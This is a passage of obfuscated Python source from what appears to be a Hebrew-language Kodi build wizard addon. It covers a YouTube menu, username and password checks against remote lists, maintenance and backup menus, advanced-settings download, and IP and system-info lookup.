			OOO0O00O00O00OOO0 =wiz .parseDOM (OO0OO0OOO000O0OO0 ,'addon',ret ='name',attrs ={'id':O000O0O0OO0OOO000 })#line:2418
			O0OOOO0O00OOOO00O =os .path .join (ADDONS ,O000O0O0OO0OOO000 ,'icon.png')#line:2419
			wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,OOO0O00O00O00OOO0 [0 ]),'[COLOR %s]מאפשר הרחבות[/COLOR]'%COLOR2 ,'2000',O0OOOO0O00OOOO00O )#line:2420
		except :pass #line:2421
def youtubeMenu (url =None ):#line:2423
	if not YOUTUBEFILE =='http://':#line:2424
		if url ==None :#line:2425
			OO00OOOOOOO0OOO00 =wiz .workingURL (YOUTUBEFILE )#line:2426
			OO00OOO0000OO0000 =uservar .YOUTUBEFILE #line:2427
		else :#line:2428
			OO00OOOOOOO0OOO00 =wiz .workingURL (url )#line:2429
			OO00OOO0000OO0000 =url #line:2430
		if OO00OOOOOOO0OOO00 ==True :#line:2431
			OOOO0O000000O000O =wiz .openURL (OO00OOO0000OO0000 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2432
			OOO0O000OOO0OOOO0 =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (OOOO0O000000O000O )#line:2433
			if len (OOO0O000OOO0OOOO0 )>0 :#line:2434
				for OO0O0OO000OO00OOO ,OO00O00O0OOOO00O0 ,url ,OO00OOO0O00OOO00O ,O00OOOOOOO00O0O0O ,OOO0O0000OO00O0O0 in OOO0O000OOO0OOOO0 :#line:2435
					if OO00O00O0OOOO00O0 .lower ()=="yes":#line:2436
						addDir ("[B]%s[/B]"%OO0O0OO000OO00OOO ,'youtube',url ,description =OOO0O0000OO00O0O0 ,icon =OO00OOO0O00OOO00O ,fanart =O00OOOOOOO00O0O0O ,themeit =THEME3 )#line:2437
					else :#line:2438
						addFile (OO0O0OO000OO00OOO ,'viewVideo',url =url ,description =OOO0O0000OO00O0O0 ,icon =OO00OOO0O00OOO00O ,fanart =O00OOOOOOO00O0O0O ,themeit =THEME2 )#line:2439
			else :wiz .log ("[YouTube Menu] ERROR: Invalid Format.")#line:2440
		else :#line:2441
			wiz .log ("[YouTube Menu] ERROR: URL for YouTube list not working.")#line:2442
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2443
			addFile ('%s'%OO00OOOOOOO0OOO00 ,'',themeit =THEME3 )#line:2444
	else :wiz .log ("[YouTube Menu] No YouTube list added.")#line:2445
	setView ('files','viewType')#line:2446
def STARTP ():#line:2447
	OOOO0OOOOO0OO0OO0 =(ADDON .getSetting ("pass"))#line:2448
	if BUILDNAME =="":#line:2449
	 if not NOTIFY =='true':#line:2450
          OO0O00O0O00OOOO00 =wiz .workingURL (NOTIFICATION )#line:2451
	 if not NOTIFY2 =='true':#line:2452
          OO0O00O0O00OOOO00 =wiz .workingURL (NOTIFICATION2 )#line:2453
	 if not NOTIFY3 =='true':#line:2454
          OO0O00O0O00OOOO00 =wiz .workingURL (NOTIFICATION3 )#line:2455
	OO00O0OO0OO00O00O =OOOO0OOOOO0OO0OO0 #line:2456
	OO0O00O0O00OOOO00 =urllib2 .Request (SPEED )#line:2457
	OOOO00O0O0OO00OOO =urllib2 .urlopen (OO0O00O0O00OOOO00 )#line:2458
	O0000OOO0O00000O0 =OOOO00O0O0OO00OOO .readlines ()#line:2460
	OOO000O0O0000O0O0 =0 #line:2464
	for OOO0O00000O0O0OOO in O0000OOO0O00000O0 :#line:2465
		if OOO0O00000O0O0OOO .split (' ==')[0 ]==OOOO0OOOOO0OO0OO0 or OOO0O00000O0O0OOO .split ()[0 ]==OOOO0OOOOO0OO0OO0 :#line:2466
			OOO000O0O0000O0O0 =1 #line:2467
			break #line:2468
	if OOO000O0O0000O0O0 ==0 :#line:2469
					OO00O00O0OOOO0000 =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]הסיסמה אינה נכונה,"%(COLOR2 ),"הכנס את הסיסמה כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2470
					if OO00O00O0OOOO0000 :#line:2472
						ADDON .openSettings ()#line:2474
						STARTP ()#line:2475
						sys .exit ()#line:2476
					else :#line:2477
						sys .exit ()#line:2478
	return 'ok'#line:2482
def STARTP2 ():#line:2483
	O0O0O0O0O00O0OO0O =(ADDON .getSetting ("user"))#line:2484
	OO0O0O0O0OO0O0OO0 =(UNAME )#line:2486
	O0O0OOO0000OOOO00 =urllib2 .urlopen (OO0O0O0O0OO0O0OO0 )#line:2487
	O00OOO000000OO000 =O0O0OOO0000OOOO00 .readlines ()#line:2488
	O0OO0O00OO00O00OO =0 #line:2489
	for O000OO000000OOOOO in O00OOO000000OO000 :#line:2492
		if O000OO000000OOOOO .split (' ==')[0 ]==O0O0O0O0O00O0OO0O or O000OO000000OOOOO .split ()[0 ]==O0O0O0O0O00O0OO0O :#line:2493
			O0OO0O00OO00O00OO =1 #line:2494
			break #line:2495
	if O0OO0O00OO00O00OO ==0 :#line:2496
		OO00O0O0000OOOO00 =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]שם המתשמש שהוכנס אינו נכון,"%(COLOR2 ),"הכנס את שם המשתמש כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2497
		if OO00O0O0000OOOO00 :#line:2499
			ADDON .openSettings ()#line:2501
			STARTP2 ()#line:2503
			sys .exit ()#line:2504
		else :#line:2505
			sys .exit ()#line:2506
	return 'ok'#line:2510
def passandpin ():#line:2511
	addFile ('קבל קוד אימות','getpass',name ,'getpass',themeit =THEME1 )#line:2512
	addFile ('הכנס שם משתמש','setuname',name ,'setuname',themeit =THEME1 )#line:2513
	addFile ('הכנס סיסמה','setpass',name ,'setpass',themeit =THEME1 )#line:2514
def passandUsername ():#line:2515
	ADDON .openSettings ()#line:2516
def folderback ():#line:2519
    OOOOOOOOO00O0OOO0 =ADDON .getSetting ("path")#line:2520
    if OOOOOOOOO00O0OOO0 :#line:2521
      OOOOOOOOO00O0OOO0 =xbmcgui .Dialog ().browse (0 ,"בחר תקייה",'files','',False ,False ,HOME )#line:2522
      ADDON .setSetting ("path",OOOOOOOOO00O0OOO0 )#line:2523
def backmyupbuild ():#line:2526
		addFile ('מחק את תיקיית הגיבוי שלי','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2530
		addFile ('[COLOR %s]%s[/COLOR]מיקום גיבוי: '%(COLOR2 ,MYBUILDS ),'folderback','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2531
		addFile ('גיבוי בילד שלם','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2532
		addFile ('גיבוי הגדרות סקין ותפריטים בלבד','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2534
		addFile ('גיבוי הגדרות של הרחבות כולל תפריטים וסיסמאות','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2535
		addFile ('שחזור בילד שלם','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2536
		addFile ('שחזור הגדרות','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2538
def maintMenu (view =None ):#line:2542
	OO0000OO0O0OO0OO0 ='[B][COLOR green]ON[/COLOR][/B]';O0OO0O0O0OOOOO000 ='[B][COLOR red]OFF[/COLOR][/B]'#line:2544
	O0O0OO0OOOOO0OO00 ='true'if AUTOCLEANUP =='true'else 'false'#line:2545
	OO0OOOOOOO0OO0OO0 ='true'if AUTOCACHE =='true'else 'false'#line:2546
	OO00O0OOO00O00O00 ='true'if AUTOPACKAGES =='true'else 'false'#line:2547
	O0O0O0OO000O0OO00 ='true'if AUTOTHUMBS =='true'else 'false'#line:2548
	O00OOOO0OO00O0O00 ='true'if SHOWMAINT =='true'else 'false'#line:2549
	OO0O0O0OOOO0OOOOO ='true'if INCLUDEVIDEO =='true'else 'false'#line:2550
	OO0OO0O0O0OOOOO00 ='true'if INCLUDEALL =='true'else 'false'#line:2551
	O00000O00000O000O ='true'if THIRDPARTY =='true'else 'false'#line:2552
	if wiz .Grab_Log (True )==False :O0OOO0000O00000O0 =0 #line:2553
	else :O0OOO0000O00000O0 =errorChecking (wiz .Grab_Log (True ),True ,True )#line:2554
	if wiz .Grab_Log (True ,True )==False :OO00O0O00O0000O00 =0 #line:2555
	else :OO00O0O00O0000O00 =errorChecking (wiz .Grab_Log (True ,True ),True ,True )#line:2556
	O0OOO0OO0O00OOO00 =int (O0OOO0000O00000O0 )+int (OO00O0O00O0000O00 )#line:2557
	O0OO00OOOOO0OOOOO =str (O0OOO0OO0O00OOO00 )+' Error(s) Found'if O0OOO0OO0O00OOO00 >0 else 'None Found'#line:2558
	O0O000OOO0OO0OOOO =': [COLOR red]Not Found[/COLOR]'if not os .path .exists (WIZLOG )else ": [COLOR green]%s[/COLOR]"%wiz .convertSize (os .path .getsize (WIZLOG ))#line:2559
	if OO0OO0O0O0OOOOO00 =='true':#line:2560
		OOOO00OO0O0O0OO0O ='true'#line:2561
		OO0OO00O00OOOO0O0 ='true'#line:2562
		O0OO0OO00OO0O0O00 ='true'#line:2563
		OOOOOO0OO0O000O00 ='true'#line:2564
		O0000000OOO0O0O0O ='true'#line:2565
		O0OO000OO0OO0OOO0 ='true'#line:2566
		O00OO0O0000OOOO0O ='true'#line:2567
		OOO0000OO000O0OOO ='true'#line:2568
	else :#line:2569
		OOOO00OO0O0O0OO0O ='true'if INCLUDEBOB =='true'else 'false'#line:2570
		OO0OO00O00OOOO0O0 ='true'if INCLUDEPHOENIX =='true'else 'false'#line:2571
		O0OO0OO00OO0O0O00 ='true'if INCLUDESPECTO =='true'else 'false'#line:2572
		OOOOOO0OO0O000O00 ='true'if INCLUDEGENESIS =='true'else 'false'#line:2573
		O0000000OOO0O0O0O ='true'if INCLUDEEXODUS =='true'else 'false'#line:2574
		O0OO000OO0OO0OOO0 ='true'if INCLUDEONECHAN =='true'else 'false'#line:2575
		O00OO0O0000OOOO0O ='true'if INCLUDESALTS =='true'else 'false'#line:2576
		OOO0000OO000O0OOO ='true'if INCLUDESALTSHD =='true'else 'false'#line:2577
	O000OO00OO0OO0000 =wiz .getSize (PACKAGES )#line:2578
	O000OOOO0O0OOOO00 =wiz .getSize (THUMBS )#line:2579
	OOO0OO0O00000OO0O =wiz .getCacheSize ()#line:2580
	O000O0O000OOO0O00 =O000OO00OO0OO0000 +O000OOOO0O0OOOO00 +OOO0OO0O00000OO0O #line:2581
	OOOO00OO00O0000OO =['Daily','Always','3 Days','Weekly']#line:2582
	addDir ('[B]Cleaning Tools[/B]','maint','clean',icon =ICONMAINT ,themeit =THEME1 )#line:2583
	if view =="clean"or SHOWMAINT =='true':#line:2584
		addFile ('ניקוי מלא: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O000O0O000OOO0O00 ),'fullclean',icon =ICONMAINT ,themeit =THEME3 )#line:2585
		addFile ('ניקוי קאש: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OOO0OO0O00000OO0O ),'clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2586
		addFile ('ניקוי חבילות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O000OO00OO0OO0000 ),'clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2587
		addFile ('ניקוי תמונות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O000OOOO0O0OOOO00 ),'clearthumb',icon =ICONMAINT ,themeit =THEME3 )#line:2588
		addFile ('ניקוי תמונות ישנות','oldThumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2589
		addFile ('ניקוי קאש לוג','clearcrash',icon =ICONMAINT ,themeit =THEME3 )#line:2590
		addFile ('ניקוי חבילות ישנות','purgedb',icon =ICONMAINT ,themeit =THEME3 )#line:2591
		addFile ('התקנה נקיה','freshstart',icon =ICONMAINT ,themeit =THEME3 )#line:2592
	addDir ('[B]Addon Tools[/B]','maint','addon',icon =ICONMAINT ,themeit =THEME1 )#line:2593
	if view =="addon"or SHOWMAINT =='false':#line:2594
		addFile ('הסרת הרחבות','removeaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2595
		addDir ('הסרת מידע הרחבות','removeaddondata',icon =ICONMAINT ,themeit =THEME3 )#line:2596
		addDir ('הפעלה או ביטול הרחבות','enableaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2597
		addFile ('Enable/Disable Adult Addons','toggleadult',icon =ICONMAINT ,themeit =THEME3 )#line:2598
		addFile ('בודק עדכונים','forceupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2599
		addFile ('Hide Passwords On Keyboard Entry','hidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2600
		addFile ('Unhide Passwords On Keyboard Entry','unhidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2601
	addDir ('[B]Misc Maintenance[/B]','maint','misc',icon =ICONMAINT ,themeit =THEME1 )#line:2602
	if view =="misc"or SHOWMAINT =='true':#line:2603
		addFile ('Kodi 17 Fix','kodi17fix',icon =ICONMAINT ,themeit =THEME3 )#line:2604
		addFile ('Reload Skin','forceskin',icon =ICONMAINT ,themeit =THEME3 )#line:2605
		addFile ('Reload Profile','forceprofile',icon =ICONMAINT ,themeit =THEME3 )#line:2606
		addFile ('Force Close Kodi','forceclose',icon =ICONMAINT ,themeit =THEME3 )#line:2607
		addFile ('Upload Kodi.log','uploadlog',icon =ICONMAINT ,themeit =THEME3 )#line:2608
		addFile ('View Errors in Log: %s'%(O0OO00OOOOO0OOOOO ),'viewerrorlog',icon =ICONMAINT ,themeit =THEME3 )#line:2609
		addFile ('View Log File','viewlog',icon =ICONMAINT ,themeit =THEME3 )#line:2610
		addFile ('View Wizard Log File','viewwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2611
		addFile ('Clear Wizard Log File%s'%O0O000OOO0OO0OOOO ,'clearwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2612
	addDir ('[B]שחזור וגיבוי[/B]','maint','backup',icon =ICONMAINT ,themeit =THEME1 )#line:2613
	if view =="backup"or SHOWMAINT =='true':#line:2614
		addFile ('Clean Up Back Up Folder','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2615
		addFile ('Back Up Location: [COLOR %s]%s[/COLOR]'%(COLOR2 ,MYBUILDS ),'settings','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2616
		addFile ('[גיבוי]: בילד','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2617
		addFile ('[גיבוי]: פרופילים','backupgui',icon =ICONMAINT ,themeit =THEME3 )#line:2618
		addFile ('[גיבוי]: סקינים','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2619
		addFile ('[גיבוי]: אדון דאטה','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2620
		addFile ('[שחזור]: בילד מתיקיה מקומית','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2621
		addFile ('[שחזור]: פרופילים מתיקיה מקומית','restoregui',icon =ICONMAINT ,themeit =THEME3 )#line:2622
		addFile ('[שחזור]: אדון דאטה מתיקיה מקומית','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2623
		addFile ('[שחזור]: בילד מתיקיה חיצונית','restoreextzip',icon =ICONMAINT ,themeit =THEME3 )#line:2624
		addFile ('[שחזור]: פרופילים מתיקיה חיצונית','restoreextgui',icon =ICONMAINT ,themeit =THEME3 )#line:2625
		addFile ('[שחזור]: אדון דאטה מתיקיה חיצונית','restoreextaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2626
	addDir ('[B]System Tweaks/Fixes[/B]','maint','tweaks',icon =ICONMAINT ,themeit =THEME1 )#line:2627
	if view =="tweaks"or SHOWMAINT =='true':#line:2628
		if not ADVANCEDFILE =='http://'and not ADVANCEDFILE =='':#line:2629
			addDir ('Advanced Settings','advancedsetting',icon =ICONMAINT ,themeit =THEME3 )#line:2630
		else :#line:2631
			if os .path .exists (ADVANCED ):#line:2632
				addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2633
				addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2634
			addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2635
		addFile ('Scan Sources for broken links','checksources',icon =ICONMAINT ,themeit =THEME3 )#line:2636
		addFile ('Scan For Broken Repositories','checkrepos',icon =ICONMAINT ,themeit =THEME3 )#line:2637
		addFile ('Fix Addons Not Updating','fixaddonupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2638
		addFile ('Remove Non-Ascii filenames','asciicheck',icon =ICONMAINT ,themeit =THEME3 )#line:2639
		addFile ('Convert Paths to special','convertpath',icon =ICONMAINT ,themeit =THEME3 )#line:2640
		addDir ('System Information','systeminfo',icon =ICONMAINT ,themeit =THEME3 )#line:2641
	addFile ('Show All Maintenance: %s'%O00OOOO0OO00O0O00 .replace ('true',OO0000OO0O0OO0OO0 ).replace ('false',O0OO0O0O0OOOOO000 ),'togglesetting','showmaint',icon =ICONMAINT ,themeit =THEME2 )#line:2642
	addDir ('[I]<< Return to Main Menu[/I]',icon =ICONMAINT ,themeit =THEME2 )#line:2643
	addFile ('Third Party Wizards: %s'%O00000O00000O000O .replace ('true',OO0000OO0O0OO0OO0 ).replace ('false',O0OO0O0O0OOOOO000 ),'togglesetting','enable3rd',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2644
	if O00000O00000O000O =='true':#line:2645
		OOO0O0OOOOO00O0O0 =THIRD1NAME if not THIRD1NAME ==''else 'Not Set'#line:2646
		OOO0OOO00OOO000O0 =THIRD2NAME if not THIRD2NAME ==''else 'Not Set'#line:2647
		OOOOO0OO00000OOO0 =THIRD3NAME if not THIRD3NAME ==''else 'Not Set'#line:2648
		addFile ('Edit Third Party Wizard 1: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OOO0O0OOOOO00O0O0 ),'editthird','1',icon =ICONMAINT ,themeit =THEME3 )#line:2649
		addFile ('Edit Third Party Wizard 2: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OOO0OOO00OOO000O0 ),'editthird','2',icon =ICONMAINT ,themeit =THEME3 )#line:2650
		addFile ('Edit Third Party Wizard 3: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OOOOO0OO00000OOO0 ),'editthird','3',icon =ICONMAINT ,themeit =THEME3 )#line:2651
	addFile ('ניקוי אוטומטי','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2652
	addFile ('ניקוי אוטומטי בהפעלה: %s'%O0O0OO0OOOOO0OO00 .replace ('true',OO0000OO0O0OO0OO0 ).replace ('false',O0OO0O0O0OOOOO000 ),'togglesetting','autoclean',icon =ICONMAINT ,themeit =THEME3 )#line:2653
	if O0O0OO0OOOOO0OO00 =='true':#line:2654
		addFile ('--- תדירות ניקוי: [B][COLOR green]%s[/COLOR][/B]'%OOOO00OO00O0000OO [AUTOFEQ ],'changefeq',icon =ICONMAINT ,themeit =THEME3 )#line:2655
		addFile ('--- ניקוי קאש בהפעלה: %s'%OO0OOOOOOO0OO0OO0 .replace ('true',OO0000OO0O0OO0OO0 ).replace ('false',O0OO0O0O0OOOOO000 ),'togglesetting','clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2656
		addFile ('--- ניקוי חבילות בהפעלה: %s'%OO00O0OOO00O00O00 .replace ('true',OO0000OO0O0OO0OO0 ).replace ('false',O0OO0O0O0OOOOO000 ),'togglesetting','clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2657
		addFile ('--- ניקוי תמונות ישנות בהפעלה: %s'%O0O0O0OO000O0OO00 .replace ('true',OO0000OO0O0OO0OO0 ).replace ('false',O0OO0O0O0OOOOO000 ),'togglesetting','clearthumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2658
	addFile ('ניקוי וידאו קאש','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2659
	addFile ('Include Video Cache in Clear Cache: %s'%OO0O0O0OOOO0OOOOO .replace ('true',OO0000OO0O0OO0OO0 ).replace ('false',O0OO0O0O0OOOOO000 ),'togglecache','includevideo',icon =ICONMAINT ,themeit =THEME3 )#line:2660
	if OO0O0O0OOOO0OOOOO =='true':#line:2661
		addFile ('--- Include All Video Addons: %s'%OO0OO0O0O0OOOOO00 .replace ('true',OO0000OO0O0OO0OO0 ).replace ('false',O0OO0O0O0OOOOO000 ),'togglecache','includeall',icon =ICONMAINT ,themeit =THEME3 )#line:2662
		addFile ('--- Include Bob: %s'%OOOO00OO0O0O0OO0O .replace ('true',OO0000OO0O0OO0OO0 ).replace ('false',O0OO0O0O0OOOOO000 ),'togglecache','includebob',icon =ICONMAINT ,themeit =THEME3 )#line:2663
		addFile ('--- Include Phoenix: %s'%OO0OO00O00OOOO0O0 .replace ('true',OO0000OO0O0OO0OO0 ).replace ('false',O0OO0O0O0OOOOO000 ),'togglecache','includephoenix',icon =ICONMAINT ,themeit =THEME3 )#line:2664
		addFile ('--- Include Specto: %s'%O0OO0OO00OO0O0O00 .replace ('true',OO0000OO0O0OO0OO0 ).replace ('false',O0OO0O0O0OOOOO000 ),'togglecache','includespecto',icon =ICONMAINT ,themeit =THEME3 )#line:2665
		addFile ('--- Include Exodus: %s'%O0000000OOO0O0O0O .replace ('true',OO0000OO0O0OO0OO0 ).replace ('false',O0OO0O0O0OOOOO000 ),'togglecache','includeexodus',icon =ICONMAINT ,themeit =THEME3 )#line:2666
		addFile ('--- Include Salts: %s'%O00OO0O0000OOOO0O .replace ('true',OO0000OO0O0OO0OO0 ).replace ('false',O0OO0O0O0OOOOO000 ),'togglecache','includesalts',icon =ICONMAINT ,themeit =THEME3 )#line:2667
		addFile ('--- Include Salts HD Lite: %s'%OOO0000OO000O0OOO .replace ('true',OO0000OO0O0OO0OO0 ).replace ('false',O0OO0O0O0OOOOO000 ),'togglecache','includesaltslite',icon =ICONMAINT ,themeit =THEME3 )#line:2668
		addFile ('--- Include One Channel: %s'%O0OO000OO0OO0OOO0 .replace ('true',OO0000OO0O0OO0OO0 ).replace ('false',O0OO0O0O0OOOOO000 ),'togglecache','includeonechan',icon =ICONMAINT ,themeit =THEME3 )#line:2669
		addFile ('--- Include Genesis: %s'%OOOOOO0OO0O000O00 .replace ('true',OO0000OO0O0OO0OO0 ).replace ('false',O0OO0O0O0OOOOO000 ),'togglecache','includegenesis',icon =ICONMAINT ,themeit =THEME3 )#line:2670
		addFile ('--- Enable All Video Addons','togglecache','true',icon =ICONMAINT ,themeit =THEME3 )#line:2671
		addFile ('--- Disable All Video Addons','togglecache','false',icon =ICONMAINT ,themeit =THEME3 )#line:2672
	setView ('files','viewType')#line:2673
def advancedWindow (url =None ):#line:2675
	if not ADVANCEDFILE =='http://':#line:2676
		if url ==None :#line:2677
			O00O0OOOO00000OOO =wiz .workingURL (ADVANCEDFILE )#line:2678
			OO0OO0O00OOO000O0 =uservar .ADVANCEDFILE #line:2679
		else :#line:2680
			O00O0OOOO00000OOO =wiz .workingURL (url )#line:2681
			OO0OO0O00OOO000O0 =url #line:2682
		addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2683
		if os .path .exists (ADVANCED ):#line:2684
			addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2685
			addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2686
		if O00O0OOOO00000OOO ==True :#line:2687
			if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONMAINT ,themeit =THEME3 )#line:2688
			O00O0O00OO00OO0O0 =wiz .openURL (OO0OO0O00OOO000O0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2689
			OO000000O000O00OO =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (O00O0O00OO00OO0O0 )#line:2690
			if len (OO000000O000O00OO )>0 :#line:2691
				for O00000OOOOO0O00OO ,OOO0OO00OOOO000OO ,url ,OO000O0O0O000OOO0 ,O00OO0O0OOO0O00OO ,OOO00O0O0O000O000 in OO000000O000O00OO :#line:2692
					if OOO0OO00OOOO000OO .lower ()=="yes":#line:2693
						addDir ("[B]%s[/B]"%O00000OOOOO0O00OO ,'advancedsetting',url ,description =OOO00O0O0O000O000 ,icon =OO000O0O0O000OOO0 ,fanart =O00OO0O0OOO0O00OO ,themeit =THEME3 )#line:2694
					else :#line:2695
						addFile (O00000OOOOO0O00OO ,'writeadvanced',O00000OOOOO0O00OO ,url ,description =OOO00O0O0O000O000 ,icon =OO000O0O0O000OOO0 ,fanart =O00OO0O0OOO0O00OO ,themeit =THEME2 )#line:2696
			else :wiz .log ("[Advanced Settings] ERROR: Invalid Format.")#line:2697
		else :wiz .log ("[Advanced Settings] URL not working: %s"%O00O0OOOO00000OOO )#line:2698
	else :wiz .log ("[Advanced Settings] not Enabled")#line:2699
def writeAdvanced (O000OO0O0000OO0O0 ,OO0O00O0OOOO0000O ):#line:2701
	OOOOO000OOO0OOO00 =wiz .workingURL (OO0O00O0OOOO0000O )#line:2702
	if OOOOO000OOO0OOO00 ==True :#line:2703
		if os .path .exists (ADVANCED ):O0OOO0OOO00000000 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to overwrite your current Advanced Settings with [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,O000OO0O0000OO0O0 ),yeslabel ="[B][COLOR green]Overwrite[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel[/COLOR][/B]")#line:2704
		else :O0OOO0OOO00000000 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,O000OO0O0000OO0O0 ),yeslabel ="[B][COLOR green]התקנה[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:2705
		if O0OOO0OOO00000000 ==1 :#line:2707
			OOOO0OO000O00O0OO =wiz .openURL (OO0O00O0OOOO0000O )#line:2708
			OO000O0OOOOO0OO00 =open (ADVANCED ,'w');#line:2709
			OO000O0OOOOO0OO00 .write (OOOO0OO000O00O0OO )#line:2710
			OO000O0OOOOO0OO00 .close ()#line:2711
			DIALOG .ok (ADDONTITLE ,'[COLOR %s]AdvancedSettings.xml file has been successfully written.  Once you click okay it will force close kodi.[/COLOR]'%COLOR2 )#line:2712
			wiz .killxbmc (True )#line:2713
		else :wiz .log ("[Advanced Settings] install canceled");wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Write Cancelled![/COLOR]"%COLOR2 );return #line:2714
	else :wiz .log ("[Advanced Settings] URL not working: %s"%OOOOO000OOO0OOO00 );wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]URL Not Working[/COLOR]"%COLOR2 )#line:2715
def viewAdvanced ():#line:2717
	OOOO00OO000OOO0OO =open (ADVANCED )#line:2718
	O0O00O00O00OOO0O0 =OOOO00OO000OOO0OO .read ().replace ('\t','    ')#line:2719
	wiz .TextBox (ADDONTITLE ,O0O00O00O00OOO0O0 )#line:2720
	OOOO00OO000OOO0OO .close ()#line:2721
def removeAdvanced ():#line:2723
	if os .path .exists (ADVANCED ):#line:2724
		wiz .removeFile (ADVANCED )#line:2725
	else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]AdvancedSettings.xml not found[/COLOR]")#line:2726
def showAutoAdvanced ():#line:2728
	notify .autoConfig ()#line:2729
def getIP ():#line:2731
	OO0O00O0O0O0O0000 ='http://whatismyipaddress.com/'#line:2732
	if not wiz .workingURL (OO0O00O0O0O0O0000 ):return 'Unknown','Unknown','Unknown'#line:2733
	O0O0O0000O000O00O =wiz .openURL (OO0O00O0O0O0O0000 ).replace ('\n','').replace ('\r','')#line:2734
	if not 'Access Denied'in O0O0O0000O000O00O :#line:2735
		OO0O00O00O0O0OO00 =re .compile ('whatismyipaddress.com/ip/(.+?)"').findall (O0O0O0000O000O00O )#line:2736
		O0OO000O00O0OO0O0 =OO0O00O00O0O0OO00 [0 ]if (len (OO0O00O00O0O0OO00 )>0 )else 'Unknown'#line:2737
		O0OO00O00OO000OO0 =re .compile ('"font-size:14px;">(.+?)</td>').findall (O0O0O0000O000O00O )#line:2738
		O0O00OO0OO00OOOO0 =O0OO00O00OO000OO0 [0 ]if (len (O0OO00O00OO000OO0 )>0 )else 'Unknown'#line:2739
		O00000O000000OO00 =O0OO00O00OO000OO0 [1 ]+', '+O0OO00O00OO000OO0 [2 ]+', '+O0OO00O00OO000OO0 [3 ]if (len (O0OO00O00OO000OO0 )>2 )else 'Unknown'#line:2740
		return O0OO000O00O0OO0O0 ,O0O00OO0OO00OOOO0 ,O00000O000000OO00 #line:2741
	else :return 'Unknown','Unknown','Unknown'#line:2742
def systemInfo ():#line:2744
	OO0000000O000O0OO =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:2758
